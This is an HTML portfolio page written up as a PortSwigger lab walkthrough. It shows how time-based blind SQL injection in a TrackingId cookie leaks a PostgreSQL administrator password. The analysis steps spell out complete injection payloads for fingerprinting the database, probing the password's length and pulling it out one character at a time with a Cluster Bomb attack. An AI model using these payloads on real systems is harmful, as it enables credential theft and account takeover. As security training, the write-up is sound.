@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 15 — Blind SQL injection with time delays and information retrieval — Waseef's Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --accent: #58a6ff; --accent2: #3fb950; --red: #f85149;
+      --orange: #d29922; --radius: 8px;
+      --c-red: #f85149; --c-blue: #58a6ff; --c-green: #3fb950;
+      --c-yellow: #d29922; --c-purple: #bc8cff; --c-pink: #ff7b72;
+      --c-gray: #8b949e;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(13,17,23,.9); backdrop-filter: blur(12px);
+          border-bottom: 1px solid var(--border); padding: .75rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { font-weight: 600; font-size: 1rem; color: var(--text); }
+    .nav-back { font-size: .85rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+    .nav-back:hover { color: var(--accent); text-decoration: none; }
+    .hero { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; }
+    .hero-inner { max-width: 860px; margin: 0 auto; }
+    .breadcrumb { font-size: .8rem; color: var(--muted); margin-bottom: 1rem; }
+    .breadcrumb a { color: var(--muted); }
+    .breadcrumb a:hover { color: var(--accent); }
+    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero p.desc { color: var(--muted); max-width: 640px; margin-top: .5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: .6rem; align-items: center; }
+    .badge { display: inline-flex; align-items: center; gap: .3rem; padding: .25rem .7rem;
+             border-radius: 20px; font-size: .75rem; font-weight: 500; }
+    .badge-platform { background: #1f3a5f; color: #58a6ff; border: 1px solid #1f4080; }
+    .badge-easy { background: #1a3a2a; color: #3fb950; border: 1px solid #2ea043; }
+    .badge-medium { background: #3a2a1a; color: #d29922; border: 1px solid #9e6a03; }
+    .badge-hard { background: #3a1a1a; color: #f85149; border: 1px solid #da3633; }
+    .badge-beginner { background: #1a3a2a; color: #56d364; border: 1px solid #2ea043; }
+    .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    h1, h2, h3 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; color: var(--accent); }
+    p { margin: .6rem 0; color: #c9d1d9; }
+    ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+    li { margin: .3rem 0; color: #c9d1d9; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+    blockquote { border-left: 3px solid var(--accent); padding: .5rem 1rem; margin: .75rem 0;
+                 background: var(--bg2); border-radius: 0 var(--radius) var(--radius) 0; color: var(--muted); }
+    pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+          padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
+    code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
+    p code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem; }
+    strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
+    figure { margin: 1.25rem 0; }
+    img { max-width: 100%; border-radius: var(--radius); border: 1px solid var(--border);
+          display: block; margin: 0 auto; }
+    figcaption { text-align: center; font-size: .8rem; color: var(--muted); margin-top: .4rem; }
+    .callout { display: flex; gap: .75rem; align-items: flex-start; background: var(--bg2);
+               border: 1px solid var(--border); border-radius: var(--radius); padding: .9rem 1rem; margin: .75rem 0; }
+    .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+    details { border: 1px solid var(--border); border-radius: var(--radius); margin: .5rem 0; }
+    summary { padding: .6rem 1rem; cursor: pointer; font-weight: 500; background: var(--bg2); border-radius: var(--radius); }
+    details[open] summary { border-radius: var(--radius) var(--radius) 0 0; border-bottom: 1px solid var(--border); }
+    details > *:not(summary) { padding: .75rem 1rem; }
+    .table-wrap { overflow-x: auto; margin: .75rem 0; }
+    table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+    th, td { padding: .6rem .9rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg3); font-weight: 600; }
+    tr:nth-child(even) { background: rgba(33,38,45,.5); }
+    .columns { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: .75rem 0; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
+    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem;
+            transition: border-color .15s, transform .15s; display: block; }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); text-decoration: none; }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: .6rem; gap: .5rem; }
+    .card-title { font-size: 14px; font-weight: 600; color: var(--text); }
+    .card-meta { font-size: 12px; color: var(--muted); margin-bottom: .4rem; }
+    .card-desc { font-size: 13px; color: var(--muted); }
+    footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; color: var(--muted); font-size: .85rem; }
+</style>
+</head>
+<body>
+<nav>
+  <span class="nav-logo">Waseef</span>
+  <a href="../../../index.html" class="nav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-inner">
+    <div class="breadcrumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../index.html#labs">Labs</a> / <a href="index.html">SQL Injection</a> / Lab 15 — Blind SQL injection with time delays and information retrieval</div>
+    <h1>Lab 15 — Blind SQL injection with time delays and information retrieval</h1>
+    <div class="meta-row">
+      <span class="badge badge-os">⚪ 🟡 Medium</span>
+      <span class="badge badge-date">📅 2026-05-19</span>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+<h2 id="finding-summary">📋 Finding Summary</h2>
+<div class='table-wrap'><table>
+  <tr><th>Field</th><th>Value</th></tr>
+  <tr><td><strong>Type</strong></td><td>Web App</td></tr>
+  <tr><td><strong>Severity</strong></td><td>🟡 Medium</td></tr>
+  <tr><td><strong>CVE / CWE</strong></td><td>CWE-89</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-05-19</td></tr>
+</table></div>
+<hr>
+<h2 id="description">🔍 Description</h2>
+<p>Blind SQL injection with time delays and information retrieval occurs when a web application is vulnerable to SQL injection but neither query results nor error messages are reflected in the HTTP response. An attacker can infer database contents purely by measuring server response times: a true condition triggers a deliberate sleep, while a false condition responds immediately. By chaining conditional time-delay payloads with functions such as PostgreSQL’s <code>SUBSTRING()</code> and <code>pg_sleep()</code>, the attacker can extract sensitive data one character at a time entirely through timing side-channels. In this lab, the <code>TrackingId</code> cookie value is embedded unsanitized into a SQL query executed by a PostgreSQL database, and the response time can be manipulated to leak the <code>administrator</code> account password from the <code>users</code> table.</p>
+<hr>
+<h2 id="end-goals">🎯 End Goals</h2>
+<ul>
+  <li>Confirm the <code>TrackingId</code> cookie is a blind SQL injection point with no visible errors</li>
+  <li>Fingerprint the database backend using database-specific time-delay payloads</li>
+  <li>Confirm the <code>administrator</code> user exists in the <code>users</code> table</li>
+  <li>Determine the exact length of the administrator’s password</li>
+  <li>Extract the full password character by character using a Cluster Bomb attack</li>
+  <li>Log in as <code>administrator</code> to solve the lab</li>
+</ul>
+<hr>
+<h2 id="steps-to-reproduce">🪜 Steps to Reproduce</h2>
+<ol>
+  <li>Browse the lab and observe the server assigns a <code>TrackingId</code> cookie on initial page load</li>
+  <li>Navigate to the login page and confirm the browser sends the <code>TrackingId</code> on subsequent requests</li>
+  <li>In Burp Repeater, append a single quote and a garbled value to the <code>TrackingId</code> to confirm no errors are reflected — establishing this as a blind injection point</li>
+  <li>Try database-specific conditional time-delay payloads (Oracle, MSSQL, PostgreSQL, MySQL) to fingerprint the backend; observe that only the PostgreSQL <code>pg_sleep()</code> payload triggers a 10-second delay</li>
+  <li>Verify the false condition produces no delay, confirming the conditional behavior is working correctly</li>
+  <li>Inject a conditional payload checking <code>username='administrator'</code> and observe the delay confirms the user exists</li>
+  <li>Use a conditional <code>LENGTH(password)</code> payload to establish upper and lower bounds, then run a Burp Intruder Sniper attack iterating the length value to determine the exact password length</li>
+  <li>Configure a Cluster Bomb attack with two payload sets — position (1 to password length) and character set (a–z, 0–9) — using the <code>SUBSTRING()</code> conditional payload</li>
+  <li>Sort Intruder results by response time descending; each position has exactly one long-response entry identifying the correct character</li>
+  <li>Assemble the extracted characters in order to recover the full password</li>
+  <li>Log in at <code>/login</code> with <code>administrator</code> and the extracted password to solve the lab</li>
+</ol>
+<hr>
+<h2 id="analysis">🧠 Analysis</h2>
+<p><strong>Step 1 — Observe the lab and identify the TrackingId cookie</strong></p>
+<p>Browsing the lab homepage showed it is marked “Not solved”. In Burp HTTP History, the initial GET <code>/</code> request returned 200 OK and the server issued a <code>TrackingId</code> cookie (e.g. <code>eSBGMirVJ7nloipW</code>). Navigating to <code>/login</code> confirmed the browser automatically sends this <code>TrackingId</code> on subsequent requests, meaning the value is processed server-side on every page load — making it a candidate injection point.</p>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728051a947fe026b96df1c.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280e28125f7aa6155bd6e.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728087a7cae7cae31c3896.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280b7a090f16f2719e984.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b75237172805b84d0eb156698a8f1.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 2 — Observe behavior with a single quote (no visible errors)</strong></p>
+<p>To establish baseline behavior, a garbled <code>TrackingId</code> value with an appended single quote was sent: <code>TrackingId=eSBGMirVJ7nloipWjkhiuh'</code>. The server returned 200 OK and the page loaded normally with no error message. This does not confirm injection — it simply shows that errors are not reflected in the response. Standard error-based and UNION-based techniques will not work here; timing-based payloads are required to infer any information from the injection point.</p>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728015a682e57e4596f70b.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280488b64d0d78601c2b9.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280e5b9b8fc9245ed3535.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 3 — Fingerprint the database with time-delay payloads</strong></p>
+<p>To identify the database backend, conditional time-delay payloads for each major database type were tested in turn:</p>
+<ul>
+  <li><strong>Oracle</strong>: <code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)||'</code> → responded immediately (not Oracle)</li>
+  <li><strong>MSSQL</strong>: <code>TrackingId=eSBGMirVJ7nloipW'||(IF (1=1) WAITFOR DELAY '0:0:10')||'</code> → responded immediately (not MSSQL)</li>
+  <li><strong>PostgreSQL</strong>: <code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'</code> → <strong>10,243 millis</strong> delay ✅ — confirmed PostgreSQL backend</li>
+  <li>To verify the conditional is working, the false condition was tested: <code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'</code> → responded immediately, confirming the delay only fires when the condition is true</li>
+</ul>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728099b35eda8543b3d43e.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728039aebbc484828952ab.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280549961f2791bf8a72a.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728068b4cde21defcd3dae.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 4 — Confirm administrator user exists</strong></p>
+<p>With the PostgreSQL conditional payload confirmed, the <code>users</code> table was queried for the <code>administrator</code> user: <code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'</code>. The server responded after <strong>10,202 millis</strong> — confirming the <code>administrator</code> user exists in the <code>users</code> table.</p>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280279147ee305b665d5d.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 5 — Determine the password length</strong></p>
+<p>To determine how many characters to extract, the password length was probed using <code>LENGTH()</code>:</p>
+<ul>
+  <li><code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)&gt;1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'</code> → <strong>10,187 millis</strong> delay (length &gt; 1 is true)</li>
+  <li><code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)&gt;30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'</code> → <strong>255 millis</strong> (length &gt; 30 is false, so length ≤ 30)</li>
+</ul>
+<p>Burp Intruder was then configured with a Sniper attack iterating the threshold value from 1 to 30, with a single concurrent request and a fixed delay between requests to allow accurate timing measurement. The results showed all payloads 1 through 20 triggered the ~10,000ms delay, while payload 21 responded in 232ms — confirming the password length is exactly <strong>20</strong>.</p>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280959414f43bf8f32626.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280189d84eb0bfb5d3bbf.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280cba649fbb8956b1d31.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280629076ed15db6f6706.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b75237172804e8986cf125d9ad0e1.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 6 — Extract the password character by character (Cluster Bomb)</strong></p>
+<p>With the length confirmed at 20 characters, a Cluster Bomb attack was configured with two payload sets: Payload 1 = position (integers 1–20), Payload 2 = character set (a–z, 0–9). The payload template was: <code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'</code>.</p>
+<p>The manual SUBSTRING test was first verified in Repeater: <code>TrackingId=eSBGMirVJ7nloipW'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'</code>. The Intruder results were sorted by response time descending — for each position, exactly one character produced a long delay, identifying the correct character. Assembling all 20 characters in order produced the password: <strong><code>7p2q9lri9y63qwfg1nun</code></strong></p>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280618f26fb2890857c94.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b75237172801988c6f95d4505d5f0.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b752371728013a832d539ae178149.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b75237172807aaf08d5df6166aace.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 7 — Log in and solve the lab</strong></p>
+<p>Logging in at <code>/login</code> with username <code>administrator</code> and the extracted password <strong><code>7p2q9lri9y63qwfg1nun</code></strong> returned the “My Account” page, confirming successful authentication and solving the lab.</p>
+<blockquote>  <figure><img src="images/lab-15-blind-sql-injection-with-time-delays-and-information-retrieval/365b7523717280f8b7e8fb7f26555626.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="impact">🎯 Impact</h2>
+<p>An attacker with access to the <code>TrackingId</code> cookie can extract arbitrary data from the database purely through timing side-channels, with no error messages or data reflected in the response. The attack requires no special privileges and can be fully automated with Burp Intruder. In this case, the administrator’s password was fully recovered from the <code>users</code> table, enabling complete account takeover. On a production system this technique could be used to exfiltrate any data accessible to the database user — including credentials, session tokens, API keys, or other sensitive records — one character at a time.</p>
+<hr>
+<h2 id="references">📚 References</h2>
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" target="_blank" rel="noopener">PortSwigger: Blind SQL injection with time delays and information retrieval</a></li>
+  <li><a href="https://portswigger.net/web-security/sql-injection/blind" target="_blank" rel="noopener">PortSwigger: Blind SQL injection</a></li>
+  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">PortSwigger: SQL injection cheat sheet</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command</a></li>
+</ul>
+<hr>
+<blockquote>🤖 Documented with Claude pentest-findings skill</blockquote>
+
+</div>
+
+<footer>Built by Waseef · <a href="../../../index.html">Back to Portfolio</a></footer>
+</body>
+</html>
